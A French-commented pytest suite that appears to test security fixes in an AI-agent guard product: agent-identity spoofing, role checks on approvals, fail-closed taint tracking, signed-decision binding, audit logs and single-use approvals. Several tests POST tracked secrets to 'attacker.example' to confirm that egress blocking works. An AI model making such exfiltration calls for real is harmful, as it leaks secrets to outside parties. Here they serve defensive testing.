"""
Non-régression des correctifs issus de l'audit (04/11/2026).

1. X-Agent-Id ne peut pas l'emporter sur l'agent lié à la clé API (usurpation,
   contournement du kill switch).
2. Approuver / rejeter / déconnecter exige un rôle admin ou developer.
3. Taint tracker saturé : fail-closed (jamais "PUBLIC" pour une valeur non suivie).
4. SDK : le vérificateur Ed25519 est réellement initialisé et appliqué, et la
   décision signée est liée à l'outil, aux arguments et à la requête.
"""

import time

import pytest

KEYS = {"key-a": "org-a", "key-b": "org-b"}
SPAN = {
    "trace_id": "t1",
    "span_id": "s1",
    "span_type": "tool_call",
    "timestamp": time.time(),
    "latency_ms": 12,
    "cost_usd": 0.01,
    "input_data": {"tool": "send_email"},
    "output_data": {},
    "security_checks": [],
}


def hdr(agent="bot"):
    return {"X-API-Key": "key-a", "X-Agent-Id": agent}


@pytest.fixture
def app_client(tmp_path, monkeypatch):
    monkeypatch.setenv("AGENTGUARD_DB_PATH", str(tmp_path / "t.db"))
    monkeypatch.setenv("AGENTGUARD_DB_TYPE", "sqlite")
    monkeypatch.setenv("AGENTGUARD_CORS_ALLOW_ALL", "true")
    monkeypatch.delenv("DATABASE_URL", raising=False)

    from collector import api, auth

    monkeypatch.setattr(auth, "resolve_org_id", lambda key: KEYS.get(key))
    api._AGENT_SEEN.clear()
    api._AGENT_STATUS.clear()
    api.helpers._MISMATCH_LOGGED.clear()

    from collector.app import create_app
    from collector.db import init_db

    init_db()
    app = create_app()
    app.config["TESTING"] = True
    with app.test_client() as c:
        yield app, c, api, monkeypatch


def _as_human(api, monkeypatch, role, org="org-a"):
    def fake():
        from flask import g

        from agentguard.identity import IdentityType, ResolvedIdentity, Role

        g.org_id, g.human_email = org, f"{role}@acme.io"
        g.identity = ResolvedIdentity(
            identity_type=IdentityType.USER,
            tenant_id="t",
            org_id=org,
            subject_id=f"u-{role}",
            role=Role(role),
        )
        return True

    monkeypatch.setattr(api, "require_human_auth", fake)


# ── 1. Usurpation d'agent via X-Agent-Id ────────────────────────────────────


def test_header_cannot_override_agent_bound_to_key(app_client):
    app, _c, api, _ = app_client
    from flask import g

    with app.test_request_context("/", headers={"X-Agent-Id": "victim-agent"}):
        g.agent_identity = {"agent_id": "my-real-agent", "org_id": "org-a"}
        assert api._request_agent_id() == "my-real-agent"


def test_org_level_key_still_uses_declared_agent(app_client):
    """Clé d'organisation (aucun agent lié) : l'identité déclarée reste utilisée."""
    app, _c, api, _ = app_client
    with app.test_request_context("/", headers={"X-Agent-Id": "finance-bot"}):
        assert api._request_agent_id() == "finance-bot"


def test_spoofed_header_does_not_bypass_kill_switch(app_client):
    """Un agent déconnecté ne peut pas se faire passer pour un autre via l'en-tête."""
    app, c, api, mp = app_client
    from flask import g

    assert c.post("/span", json=SPAN, headers=hdr("bot")).status_code in (200, 201)
    _as_human(api, mp, "admin")
    r = c.post("/api/agents/bot/disconnect", headers={"X-API-Key": "key-a"})
    assert r.status_code == 200

    api._AGENT_STATUS.clear()
    with app.test_request_context("/", headers={"X-Agent-Id": "some-other-agent"}):
        g.org_id = "org-a"
        g.agent_identity = {"agent_id": "bot", "org_id": "org-a"}
        refused = api._reject_if_agent_disconnected()
        assert refused is not None and refused[1] == 403


# ── 2. Rôle requis pour décider ─────────────────────────────────────────────


@pytest.mark.parametrize("role,expected", [("viewer", 403), ("auditor", 403)])
def test_read_only_roles_cannot_approve_reject_or_disconnect(
    app_client, role, expected
):
    _app, c, api, mp = app_client
    assert (
        c.post(
            "/api/approvals",
            headers=hdr(),
            json={"approval_id": "r1", "tool_name": "send_email"},
        ).status_code
        == 201
    )
    _as_human(api, mp, role)
    k = {"X-API-Key": "key-a"}
    assert c.post("/api/approvals/r1/approve", headers=k).status_code == expected
    assert c.post("/api/approvals/r1/reject", headers=k).status_code == expected
    assert c.post("/api/agents/bot/disconnect", headers=k).status_code == expected

    # La demande reste en attente : aucune décision n'a été prise.
    pending = c.get("/api/approvals?status=pending", headers=k).get_json()
    assert [a["id"] for a in pending["approvals"]] == ["r1"]


@pytest.mark.parametrize("role", ["admin", "developer"])
def test_admin_and_developer_can_approve(app_client, role):
    _app, c, api, mp = app_client
    c.post(
        "/api/approvals",
        headers=hdr(),
        json={"approval_id": "r2", "tool_name": "send_email"},
    )
    _as_human(api, mp, role)
    r = c.post("/api/approvals/r2/approve", headers={"X-API-Key": "key-a"})
    assert r.status_code == 200 and r.get_json()["status"] == "approved"


def test_approval_agent_comes_from_key_not_body(app_client):
    _app, c, _api, _ = app_client
    # Org key + corps qui tente d'imposer un autre agent : l'en-tête déclaré gagne
    # sur le corps (le corps n'est qu'un dernier recours).
    c.post(
        "/api/approvals",
        headers=hdr("real-bot"),
        json={"approval_id": "r3", "tool_name": "x", "agent_id": "victim"},
    )
    pending = c.get(
        "/api/approvals?status=pending", headers={"X-API-Key": "key-a"}
    ).get_json()
    row = next(a for a in pending["approvals"] if a["id"] == "r3")
    assert row["agent_id"] == "real-bot"


# ── 3. Taint tracker : saturation fail-closed ───────────────────────────────


def _secrets(n):
    import secrets

    return [secrets.token_hex(12) for _ in range(n)]


def test_taint_saturation_is_explicit_and_fail_closed():
    from agentguard.taint import FlowTracker, TaintLevel

    vals = _secrets(520)
    ft = FlowTracker()
    for v in vals:
        ft.track(v, level=TaintLevel.SECRET)

    assert ft.saturated is True and ft.dropped_needles > 0
    assert ft.report()["saturated"] is True

    # La valeur lue APRÈS saturation n'est plus suivie, mais n'est pas "PUBLIC".
    label = ft.level_in({"body": vals[-1]})
    assert label.level >= TaintLevel.SECRET
    assert label.source == "tracker_saturated"

    # Même en base64 : jamais assimilée à une donnée sûre.
    import base64

    enc = base64.b64encode(vals[-1].encode()).decode()
    assert ft.level_in({"body": enc}).level >= TaintLevel.SECRET


def test_taint_clear_recovers_from_saturation():
    from agentguard.taint import FlowTracker, TaintLevel

    ft = FlowTracker()
    for v in _secrets(520):
        ft.track(v, level=TaintLevel.SECRET)
    assert ft.saturated
    ft.clear()
    assert ft.saturated is False
    assert ft.level_in({"body": "hello world"}).level == TaintLevel.PUBLIC


def test_taint_full_tracker_evicts_low_level_for_high_level():
    from agentguard.taint import FlowTracker, TaintLevel

    ft = FlowTracker()
    for v in _secrets(520):
        ft.track(v, level=TaintLevel.CONFIDENTIAL)
    assert ft.saturated
    ft.clear()

    for v in _secrets(60):
        ft.track(v, level=TaintLevel.CONFIDENTIAL)  # remplit le stock
    big = _secrets(40)
    for v in big:
        ft.track(v, level=TaintLevel.SECRET)  # doit évincer du CONFIDENTIAL
    # Le dernier secret (le plus grave) est réellement suivi, pas seulement "plancher".
    assert ft.level_in({"x": big[-1]}).source == "tracked_value"


def test_taint_warn_mode_keeps_legacy_behaviour_but_flags_it():
    from agentguard.taint import FlowTracker, TaintLevel

    vals = _secrets(520)
    ft = FlowTracker(on_saturation="warn")
    for v in vals:
        ft.track(v, level=TaintLevel.SECRET)
    assert ft.saturated is True
    assert ft.level_in({"body": vals[-1]}).level == TaintLevel.PUBLIC


def test_unknown_saturation_mode_defaults_to_block():
    from agentguard.taint import FlowTracker

    assert FlowTracker(on_saturation="nonsense").on_saturation == "block"


# ── 4. Décisions signées : vérificateur actif + liaison à l'action ──────────


@pytest.fixture
def signer(monkeypatch):
    from agentguard.signing import DecisionSigner

    monkeypatch.setenv("AGENTGUARD_ALLOW_EPHEMERAL_SIGNING_KEY", "true")
    return DecisionSigner()


def _guard(public_pem=None, monkeypatch=None):
    from agentguard.sdk import AgentGuard

    return AgentGuard(
        collector_url="http://collector.invalid",
        api_key="k",
        agent_id="a",
        public_key_pem=public_pem,
    )


def test_verifier_is_initialised_when_public_key_given(signer, monkeypatch):
    monkeypatch.delenv("AGENTGUARD_PUBLIC_KEY", raising=False)
    assert _guard()._verifier is None
    assert _guard(signer.public_key_pem())._verifier is not None


def test_verifier_from_environment_with_escaped_newlines(signer, monkeypatch):
    monkeypatch.setenv(
        "AGENTGUARD_PUBLIC_KEY", signer.public_key_pem().replace("\n", "\\n")
    )
    assert _guard()._verifier is not None


def test_invalid_public_key_fails_closed_at_construction(monkeypatch):
    monkeypatch.delenv("AGENTGUARD_PUBLIC_KEY", raising=False)
    with pytest.raises(ValueError):
        _guard("not a pem")


class _Resp:
    def __init__(self, body, status=200):
        self._b, self.status_code = body, status

    def json(self):
        return self._b


def _serve(monkeypatch, make_body):
    """Fait répondre au SDK un collector simulé qui signe make_body(request_json)."""
    import agentguard.sdk as sdk_mod

    def fake_post(url, json=None, **kw):
        return _Resp(make_body(json))

    monkeypatch.setattr(sdk_mod.requests, "post", fake_post)


def _honest(signer, action="ALLOW", **override):
    from agentguard.signing import params_digest

    def make(req):
        d = {
            "request_id": "r",
            "action": action,
            "policy_name": "p",
            "policy_version": 1,
            "reason": "ok",
            "tool_name": req["tool_name"],
            "agent_id": "a",
            "org_id": "org",
            "args_sha256": params_digest(req["params"]),
            "nonce": req["nonce"],
        }
        d.update(override)
        return signer.sign_decision(d)

    return make


def test_valid_bound_decision_is_accepted(signer, monkeypatch):
    g = _guard(signer.public_key_pem())
    _serve(monkeypatch, _honest(signer))
    out = g._request_signed_decision("send_email", {"to": "a@b.c", "n": 2})
    assert out and out["action"] == "ALLOW"


def test_forged_decision_from_attacker_key_is_rejected(signer, monkeypatch):
    from agentguard.signing import DecisionSigner

    monkeypatch.setenv("AGENTGUARD_ALLOW_EPHEMERAL_SIGNING_KEY", "true")
    attacker = DecisionSigner()
    g = _guard(signer.public_key_pem())
    _serve(monkeypatch, _honest(attacker))
    assert g._request_signed_decision("send_email", {"to": "x"}) is None


def test_decision_for_another_tool_is_rejected(signer, monkeypatch):
    g = _guard(signer.public_key_pem())
    _serve(monkeypatch, _honest(signer, tool_name="read_file"))
    assert g._request_signed_decision("send_email", {"to": "x"}) is None


def test_decision_for_other_arguments_is_rejected(signer, monkeypatch):
    g = _guard(signer.public_key_pem())
    _serve(monkeypatch, _honest(signer, args_sha256="0" * 64))
    assert g._request_signed_decision("send_email", {"to": "x"}) is None


def test_replayed_decision_with_old_nonce_is_rejected(signer, monkeypatch):
    g = _guard(signer.public_key_pem())
    _serve(monkeypatch, _honest(signer, nonce="a-previous-request"))
    assert g._request_signed_decision("send_email", {"to": "x"}) is None


def test_unbound_legacy_decision_is_rejected(signer, monkeypatch):
    g = _guard(signer.public_key_pem())
    _serve(
        monkeypatch,
        lambda req: signer.sign_decision(
            {"request_id": "r", "action": "ALLOW", "policy_name": "p"}
        ),
    )
    assert g._request_signed_decision("send_email", {"to": "x"}) is None


def test_guarded_tool_is_denied_when_signed_decision_is_forged(signer, monkeypatch):
    """Bout en bout côté SDK : une fausse décision ALLOW ne permet jamais l'exécution."""
    from agentguard.exceptions import SecurityException
    from agentguard.signing import DecisionSigner

    monkeypatch.setenv("AGENTGUARD_ALLOW_EPHEMERAL_SIGNING_KEY", "true")
    g = _guard(signer.public_key_pem())
    _serve(monkeypatch, _honest(DecisionSigner()))
    ran = []

    @g.guard_tool_call("lookup")
    def lookup(q):
        ran.append(q)
        return "ok"

    with pytest.raises(SecurityException):
        lookup("hello")
    assert ran == []


# ── 5. Audit : checkpoints durables, persistance visible, ancrage ───────────


def _audit_log(tmp_path, signer, monkeypatch, **kw):
    from agentguard.audit import ImmutableAuditLog

    monkeypatch.delenv("AGENTGUARD_SIGNING_PUBLIC_KEY", raising=False)
    return ImmutableAuditLog(
        backup_file=str(tmp_path / "audit.jsonl"),
        signing_key_pem=signer.export_private_pem(),
        sign_every=1,
        **kw,
    )


def _log(log, n):
    from agentguard.audit import AuditEventType

    for i in range(n):
        log.log_event(
            next(iter(AuditEventType)), "org", "actor", f"res{i}", "act", {"i": i}
        )


def test_audit_checkpoint_signature_does_not_expire(tmp_path, signer, monkeypatch):
    """Une signature de checkpoint reste valide bien après 5 minutes."""
    import agentguard.signing as signing_mod

    log = _audit_log(tmp_path, signer, monkeypatch)
    _log(log, 3)
    ok, report = log.verify_chain()
    assert ok and report["signatures_verified"] >= 1

    real_time = time.time
    monkeypatch.setattr(signing_mod.time, "time", lambda: real_time() + 3600 * 24 * 365)
    ok, report = log.verify_chain()
    assert ok, report
    assert report["signatures_failed"] == 0


def test_audit_checkpoint_signature_is_not_a_valid_runtime_decision(
    tmp_path, signer, monkeypatch
):
    """Une signature d'audit sans expiration ne peut pas servir de décision runtime."""
    import json

    from agentguard.signing import DecisionVerifier

    log = _audit_log(tmp_path, signer, monkeypatch)
    _log(log, 1)
    with open(tmp_path / "audit.jsonl") as fh:
        line = json.loads(fh.readline())
    payload = json.loads(line["signature"])
    assert "expires_at" not in payload
    v = DecisionVerifier(signer.public_key_pem())
    assert v.verify(payload) is False
    assert v.verify(payload, check_expiry=False) is True


def test_runtime_decision_signature_still_expires(signer):
    from agentguard.signing import DecisionVerifier

    v = DecisionVerifier(signer.public_key_pem())
    d = signer.sign_decision({"request_id": "r", "action": "ALLOW"}, ttl=-1)
    assert v.verify(d) is False
    assert v.verify(d, check_expiry=False) is True


def test_audit_persistence_failure_is_visible(tmp_path, signer, monkeypatch):
    monkeypatch.delenv("AGENTGUARD_AUDIT_ON_FAILURE", raising=False)
    log = _audit_log(tmp_path, signer, monkeypatch)
    assert log.status()["state"] == "OK"

    # Plus aucun stockage accessible.
    log.backup_file = str(tmp_path / "missing-dir" / "audit.jsonl")
    _log(log, 1)  # mode par défaut "degrade" : pas d'exception
    assert log.degraded is True
    assert log.status()["state"] == "AUDIT_DEGRADED"
    assert log.persist_failures == 1

    # Récupération.
    log.backup_file = str(tmp_path / "audit2.jsonl")
    _log(log, 1)
    assert log.degraded is False


def test_audit_persistence_failure_can_block(tmp_path, signer, monkeypatch):
    from agentguard.audit import AuditPersistenceError

    monkeypatch.setenv("AGENTGUARD_AUDIT_ON_FAILURE", "block")
    log = _audit_log(tmp_path, signer, monkeypatch)
    log.backup_file = str(tmp_path / "missing-dir" / "audit.jsonl")
    with pytest.raises(AuditPersistenceError):
        _log(log, 1)


def test_audit_anchor_reports_whether_it_is_independent(tmp_path, signer, monkeypatch):
    log = _audit_log(tmp_path, signer, monkeypatch)
    _log(log, 2)

    monkeypatch.delenv("AGENTGUARD_AUDIT_ANCHOR_FILE", raising=False)
    monkeypatch.delenv("AGENTGUARD_AUDIT_ANCHOR_URL", raising=False)
    a = log.publish_anchor()
    assert a["independent"] is False and a["published_to"] == ["log"]

    anchor_file = tmp_path / "anchors.jsonl"
    monkeypatch.setenv("AGENTGUARD_AUDIT_ANCHOR_FILE", str(anchor_file))
    b = log.publish_anchor()
    assert b["independent"] is True and "file" in b["published_to"]
    assert str(b["head_hash"]) in anchor_file.read_text()


# ── 6. Auto-instrumentation : multi-agents, Session, matrice d'egress ───────


@pytest.fixture
def instrumented(monkeypatch):
    """Active l'auto-instrumentation avec un réseau factice (aucun trafic réel)."""
    import requests

    from agentguard import auto_instrument as ai

    sent = []

    def fake_send(self, request, **kw):
        sent.append(request.url)
        resp = requests.Response()
        resp.status_code = 200
        resp._content = b"{}"
        return resp

    monkeypatch.setattr(requests.Session, "send", fake_send)
    ai.set_taint_tracker(None)
    ai.enable_auto_instrumentation()
    yield ai, sent
    ai.disable_auto_instrumentation()
    ai.set_taint_tracker(None)


def _tracked(secret):
    from agentguard.taint import FlowTracker, TaintLevel

    ft = FlowTracker()
    ft.track(secret, level=TaintLevel.SECRET)
    return ft


def test_second_agent_does_not_unprotect_the_first(instrumented):
    import requests

    from agentguard.models import SecurityException

    ai, sent = instrumented
    secret_a, secret_b = _secrets(2)
    ta, tb = _tracked(secret_a), _tracked(secret_b)
    ai.set_taint_tracker(ta, excluded_urls=("http://collector-a",))
    ai.set_taint_tracker(tb, excluded_urls=("http://collector-b",))  # n'écrase plus A

    with pytest.raises(SecurityException):
        requests.post("https://attacker.example/x", json={"d": secret_a})
    with pytest.raises(SecurityException):
        requests.post("https://attacker.example/x", json={"d": secret_b})
    assert sent == []


def test_collector_exemption_is_per_agent(instrumented):
    import requests

    from agentguard.models import SecurityException

    ai, sent = instrumented
    secret_a, secret_b = _secrets(2)
    ai.set_taint_tracker(_tracked(secret_a), excluded_urls=("http://collector-a",))
    ai.set_taint_tracker(_tracked(secret_b), excluded_urls=("http://collector-b",))

    # Le secret de A vers SON collector reste exempté (pas de deadlock)...
    requests.post("http://collector-a/span", json={"d": secret_a})
    # ...mais le secret de B vers le collector de A est bloqué.
    with pytest.raises(SecurityException):
        requests.post("http://collector-a/span", json={"d": secret_b})
    assert sent == ["http://collector-a/span"]


def test_requests_session_is_intercepted(instrumented):
    import requests

    from agentguard.models import SecurityException

    ai, sent = instrumented
    secret = _secrets(1)[0]
    ai.set_taint_tracker(_tracked(secret))

    session = requests.Session()
    with pytest.raises(SecurityException):
        session.post("https://attacker.example/collect", json={"data": secret})
    with pytest.raises(SecurityException):
        session.request("POST", "https://attacker.example/c", data={"k": secret})
    assert sent == []

    session.post("https://api.example/ok", json={"data": "hello"})
    assert sent == ["https://api.example/ok"]


def test_module_call_is_checked_only_once(instrumented):
    import requests

    from agentguard.taint import FlowTracker

    ai, _ = instrumented

    class Counting(FlowTracker):
        calls = 0

        def level_in(self, params):
            Counting.calls += 1
            return super().level_in(params)

    ai.set_taint_tracker(Counting())
    requests.post("https://api.example/ok", json={"a": 1})
    assert Counting.calls == 1


def test_saturated_tracker_does_not_block_other_agents_telemetry(instrumented):
    import requests

    from agentguard.models import SecurityException
    from agentguard.taint import FlowTracker, TaintLevel

    ai, sent = instrumented
    saturated = FlowTracker()
    for v in _secrets(520):
        saturated.track(v, level=TaintLevel.SECRET)
    assert saturated.saturated
    clean = FlowTracker()
    ai.set_taint_tracker(saturated, excluded_urls=("http://collector-1",))
    ai.set_taint_tracker(clean, excluded_urls=("http://collector-2",))

    # Télémétrie de l'agent 2 vers SON collector : jamais bloquée par le plancher
    # fail-closed de l'agent 1.
    requests.post("http://collector-2/span", json={"x": "ok"})
    # Un envoi vers un tiers reste bloqué (fail-closed).
    with pytest.raises(SecurityException):
        requests.post("https://third.example/x", json={"x": "ok"})
    assert sent == ["http://collector-2/span"]


def test_egress_decision_matrix(monkeypatch):
    from agentguard.auto_instrument import egress_decision
    from agentguard.taint import TaintLevel as L

    monkeypatch.delenv("AGENTGUARD_HTTP_BLOCK_CONFIDENTIAL", raising=False)
    assert [egress_decision(x) for x in (L.PUBLIC, L.INTERNAL, L.CONFIDENTIAL)] == [
        "allow"
    ] * 3
    assert [egress_decision(x) for x in (L.SECRET, L.UNTRUSTED, L.MALICIOUS)] == [
        "block"
    ] * 3
    monkeypatch.setenv("AGENTGUARD_HTTP_BLOCK_CONFIDENTIAL", "true")
    assert egress_decision(L.CONFIDENTIAL) == "block"


# ── 7. Kill switch : statut périmé = fail-closed ────────────────────────────


def test_stale_status_blocks_agent_unless_fail_open(monkeypatch):
    from agentguard.models import AgentStatusStaleException
    from agentguard.sdk import AgentGuard

    monkeypatch.setenv("AGENTGUARD_STATUS_MAX_AGE", "60")
    monkeypatch.delenv("AGENTGUARD_FAIL_OPEN", raising=False)
    g = AgentGuard(collector_url="http://collector.invalid", api_key="k", agent_id="a")

    g._check_status_fresh(time.time() - 5)  # frais : OK
    with pytest.raises(AgentStatusStaleException):
        g._check_status_fresh(time.time() - 3600)

    g.fail_open = True
    g._check_status_fresh(time.time() - 3600)  # politique explicite : OK


def test_stale_status_is_a_disconnect_exception_subclass():
    from agentguard.models import AgentDisconnectedException, AgentStatusStaleException

    assert issubclass(AgentStatusStaleException, AgentDisconnectedException)


def test_fast_path_uses_last_successful_status_age(monkeypatch):
    from agentguard.background import Snapshot
    from agentguard.models import AgentStatusStaleException
    from agentguard.sdk import AgentGuard

    monkeypatch.setenv("AGENTGUARD_STATUS_MAX_AGE", "60")
    monkeypatch.delenv("AGENTGUARD_FAIL_OPEN", raising=False)
    g = AgentGuard(collector_url="http://collector.invalid", api_key="k", agent_id="a")

    class FakePoller:
        def __init__(self, ok_at):
            self.ok_at = ok_at

        def snapshot(self):
            return Snapshot(conn_state="connected", status_ok_at=self.ok_at)

    monkeypatch.setattr(g, "_ensure_poller", lambda: FakePoller(time.time() - 5))
    g._ensure_connected_fast()  # statut récent : OK

    monkeypatch.setattr(g, "_ensure_poller", lambda: FakePoller(time.time() - 999))
    with pytest.raises(AgentStatusStaleException):
        g._ensure_connected_fast()


def test_status_check_can_be_disabled(monkeypatch):
    from agentguard.sdk import AgentGuard

    monkeypatch.setenv("AGENTGUARD_STATUS_MAX_AGE", "0")
    g = AgentGuard(collector_url="http://collector.invalid", api_key="k", agent_id="a")
    g._check_status_fresh(0.0)


# ── 8. Approbations à usage unique ──────────────────────────────────────────

ARGS = {"to": "j@x.io", "n": 2}


def _approve_one(c, api, mp, approval_id="u1", agent="bot", params=None):
    c.post(
        "/api/approvals",
        headers=hdr(agent),
        json={
            "approval_id": approval_id,
            "tool_name": "send_email",
            "params": ARGS if params is None else params,
        },
    )
    _as_human(api, mp, "admin")
    assert (
        c.post(
            f"/api/approvals/{approval_id}/approve", headers={"X-API-Key": "key-a"}
        ).status_code
        == 200
    )


def _consume(
    c, approval_id="u1", agent="bot", tool="send_email", args=None, key="key-a"
):
    from agentguard.signing import params_digest

    return c.post(
        f"/api/approvals/{approval_id}/consume",
        headers={"X-API-Key": key, "X-Agent-Id": agent},
        json={
            "tool_name": tool,
            "args_sha256": params_digest(ARGS if args is None else args),
        },
    )


def test_approval_is_single_use(app_client):
    _app, c, api, mp = app_client
    _approve_one(c, api, mp)

    status = c.get("/api/approvals/u1", headers={"X-API-Key": "key-a"}).get_json()
    assert status["status"] == "approved" and status["consumed"] is False

    assert _consume(c).status_code == 200
    again = _consume(c)
    assert again.status_code == 409 and again.get_json()["error"] == "already_consumed"

    status = c.get("/api/approvals/u1", headers={"X-API-Key": "key-a"}).get_json()
    assert status["consumed"] is True


@pytest.mark.parametrize(
    "kwargs,reason",
    [
        ({"tool": "delete_everything"}, "tool_mismatch"),
        ({"args": {"to": "attacker@evil.io", "n": 2}}, "arguments_mismatch"),
        ({"agent": "another-agent"}, "agent_mismatch"),
    ],
)
def test_approval_cannot_be_used_for_another_action(app_client, kwargs, reason):
    _app, c, api, mp = app_client
    _approve_one(c, api, mp)
    r = _consume(c, **kwargs)
    assert r.status_code == 409 and r.get_json()["error"] == reason
    # Une tentative refusée ne consomme rien : l'action légitime passe encore.
    assert _consume(c).status_code == 200


def test_unapproved_or_rejected_request_cannot_be_consumed(app_client):
    _app, c, api, mp = app_client
    c.post(
        "/api/approvals",
        headers=hdr("bot"),
        json={"approval_id": "u2", "tool_name": "send_email", "params": ARGS},
    )
    r = _consume(c, approval_id="u2")
    assert r.status_code == 409 and r.get_json()["error"] == "not_approved"

    _as_human(api, mp, "admin")
    c.post("/api/approvals/u2/reject", headers={"X-API-Key": "key-a"})
    assert _consume(c, approval_id="u2").status_code == 409


def test_same_request_after_consumption_needs_a_new_decision(app_client):
    _app, c, api, mp = app_client
    _approve_one(c, api, mp)
    assert _consume(c).status_code == 200

    # L'agent redemande la même action : repart en attente, plus d'accès gratuit.
    r = c.post(
        "/api/approvals",
        headers=hdr("bot"),
        json={"approval_id": "u1", "tool_name": "send_email", "params": ARGS},
    )
    assert r.status_code == 201
    status = c.get("/api/approvals/u1", headers={"X-API-Key": "key-a"}).get_json()
    assert status["status"] == "pending" and status["consumed"] is False
    assert _consume(c).status_code == 409


def test_concurrent_consumption_has_a_single_winner(app_client):
    import threading

    app, c, api, mp = app_client
    _approve_one(c, api, mp)
    results = []

    def attempt():
        with app.test_client() as cc:
            results.append(_consume(cc).status_code)

    threads = [threading.Thread(target=attempt) for _ in range(8)]
    [t.start() for t in threads]
    [t.join() for t in threads]
    assert sorted(results).count(200) == 1
    assert results.count(409) == 7


def test_approval_id_collision_across_orgs_is_not_reported_as_success(app_client):
    _app, c, _api, _mp = app_client
    body = {"approval_id": "same-id", "tool_name": "x", "params": {}}
    assert c.post("/api/approvals", headers=hdr("bot"), json=body).status_code == 201
    other = c.post(
        "/api/approvals",
        headers={"X-API-Key": "key-b", "X-Agent-Id": "bot"},
        json=body,
    )
    assert other.status_code == 409
    assert other.get_json()["error"] == "approval_id_conflict"


def test_approval_ids_are_scoped_by_api_key():
    from agentguard.sdk import AgentGuard

    a = AgentGuard(collector_url="http://x.invalid", api_key="key-a", agent_id="bot")
    b = AgentGuard(collector_url="http://x.invalid", api_key="key-b", agent_id="bot")
    assert a.approval_id_for("send_email", ARGS) != b.approval_id_for(
        "send_email", ARGS
    )
    assert a.approval_id_for("send_email", ARGS) == a.approval_id_for(
        "send_email", ARGS
    )


# ── 9. Rôles sur la configuration de sécurité ───────────────────────────────


@pytest.mark.parametrize("role", ["viewer", "auditor"])
def test_read_only_roles_cannot_change_security_configuration(app_client, role):
    _app, c, api, mp = app_client
    _as_human(api, mp, role)
    k = {"X-API-Key": "key-a"}
    calls = [
        c.put("/api/budgets/bot", headers=k, json={"monthly_limit_usd": 1}),
        c.delete("/api/budgets/bot", headers=k),
        c.post("/api/policy-rules", headers=k, json={}),
        c.patch("/api/policy-rules/r1", headers=k, json={}),
        c.delete("/api/policy-rules/r1", headers=k),
        c.post("/api/alert-destinations", headers=k, json={}),
        c.delete("/api/alert-destinations/d1", headers=k),
        c.put("/api/agents/bot/mode", headers=k, json={"mode": "shadow"}),
    ]
    assert [r.status_code for r in calls] == [403] * len(calls)


def test_admin_passes_the_role_gate_on_configuration(app_client):
    _app, c, api, mp = app_client
    _as_human(api, mp, "admin")
    r = c.delete("/api/policy-rules/does-not-exist", headers={"X-API-Key": "key-a"})
    assert r.status_code != 403 and r.status_code != 401


def test_agentguard_unregisters_its_tracker_when_released(monkeypatch):
    import gc

    from agentguard import auto_instrument as ai
    from agentguard.sdk import AgentGuard

    monkeypatch.setenv("AGENTGUARD_TAINT_ENABLED", "true")
    ai.set_taint_tracker(None)
    g = AgentGuard(collector_url="http://x.invalid", api_key="k", agent_id="a")
    try:
        g.auto_instrument()
        assert g._flow in ai._trackers
        flow = g._flow
        del g
        gc.collect()
        assert flow not in ai._trackers
    finally:
        ai.disable_auto_instrumentation()
        ai.set_taint_tracker(None)
